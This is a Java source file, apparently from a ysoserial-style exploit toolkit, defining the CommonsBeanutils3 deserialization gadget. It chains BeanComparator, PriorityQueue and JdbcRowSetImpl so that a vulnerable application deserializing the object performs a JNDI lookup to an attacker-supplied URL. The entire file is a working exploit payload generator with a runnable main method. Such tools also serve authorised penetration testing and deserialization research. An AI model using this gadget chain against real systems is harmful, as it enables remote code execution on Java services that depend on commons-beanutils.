package A.R.ysogate.payloads.gadgets;

import A.R.ysogate.payloads.utils.PayloadRunner;
import com.sun.rowset.JdbcRowSetImpl;
import org.apache.commons.beanutils.BeanComparator;
import A.R.ysogate.payloads.ObjectPayload;
import A.R.ysogate.payloads.annotation.Dependencies;
import A.R.ysogate.payloads.utils.Reflections;

import java.math.BigInteger;
import java.util.PriorityQueue;

@Dependencies({"commons-beanutils:commons-beanutils:1.9.2", "commons-collections:commons-collections:3.1"})
public class CommonsBeanutils3 implements ObjectPayload<Object> {

	@Override
	public Object getObject(String command) throws Exception {
		String jndiURL = null;
		if (command.toLowerCase().startsWith("jndi:")) {
			jndiURL = command.substring(5);
		}

		BeanComparator comparator = new BeanComparator("lowestSetBit");
		JdbcRowSetImpl rs         = new JdbcRowSetImpl();
		rs.setDataSourceName(jndiURL);
		rs.setMatchColumn("su18");
		PriorityQueue queue = new PriorityQueue(2, comparator);

		queue.add(new BigInteger("1"));
		queue.add(new BigInteger("1"));

		Reflections.setFieldValue(comparator, "property", "databaseMetaData");
		Reflections.setFieldValue(queue, "queue", new Object[]{rs, rs});
		return queue;
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(CommonsBeanutils3.class, args);
	}
}
